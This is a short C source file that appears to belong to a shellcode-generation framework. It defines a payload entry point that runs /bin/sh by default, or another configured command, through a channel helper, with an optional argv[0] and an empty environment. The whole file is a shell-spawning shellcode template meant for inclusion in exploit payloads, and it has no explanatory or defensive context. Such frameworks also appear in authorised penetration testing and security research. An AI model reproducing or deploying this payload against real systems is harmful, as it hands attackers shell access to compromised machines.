#include <factory.h>

#include "helpers/channel.c"
#include "helpers/process.c"

#ifndef COMMAND
#define COMMAND /bin/sh
#endif

SHELLCODE_ENTRY {

#if (SET_ARGV0 == 1)
    char *const argv[] = { (char *) TO_STRING(COMMAND), NULL };
#else
    char *const argv[] = { NULL };
#endif
    char *const envp[] = { NULL };

    Channel channel;
    execute(TO_STRING(COMMAND), argv, envp, channel);

} SHELLCODE_END
